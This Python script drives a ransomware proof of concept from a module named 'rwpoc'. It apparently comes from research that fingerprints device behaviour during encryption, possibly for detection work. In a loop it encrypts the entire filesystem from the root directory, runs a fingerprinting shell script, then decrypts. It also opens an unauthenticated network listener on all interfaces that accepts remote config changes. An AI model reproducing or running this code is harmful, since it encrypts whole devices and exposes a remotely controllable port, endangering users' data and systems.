from json import loads
from multiprocessing import Process
from os import path
from socket import AF_INET, SOCK_STREAM, socket
from subprocess import call

from globals import update_existing_config
from rwpoc import run


def listen_for_config_changes():
    with socket(AF_INET, SOCK_STREAM) as sock:
        sock.bind(("0.0.0.0", 42666))
        sock.listen(1)

        while True:
            conn, addr = sock.accept()  # keep listening for new connections
            with conn:
                while True:
                    data = conn.recv(1024)  # listen for incoming data of connection
                    if not data:
                        break
                    new_config = loads(data)
                    print("received", new_config)
                    update_existing_config(new_config)


def collect_device_fingerprint():
    call(path.join(path.abspath(path.curdir), "fingerprinter.sh")+" -n 500", shell=True)
    with open("./rw-done.txt", "w") as file:
        file.write("1")


if __name__ == "__main__":
    proc_config = Process(target=listen_for_config_changes)
    proc_config.start()

    proc_fp = Process(target=collect_device_fingerprint)

    try:
        with open("./rw-done.txt", "w") as file:
            file.write("0")
        done = False
        abs_paths = "/"  # encrypt entire device, starting from root directory

        while True:
            with open("./rw-done.txt", "r") as file:
                content = file.read()
                if content == "1":
                    done = True
            if done:
                break

            proc_fp.start()
            run(encrypt=True, absolute_paths=abs_paths)  # encrypt
            proc_fp.terminate()
            proc_fp.join()

            run(encrypt=False, absolute_paths=abs_paths)  # decrypt
    finally:
        proc_fp.terminate()
        proc_config.terminate()
        proc_fp.join()
        proc_config.join()
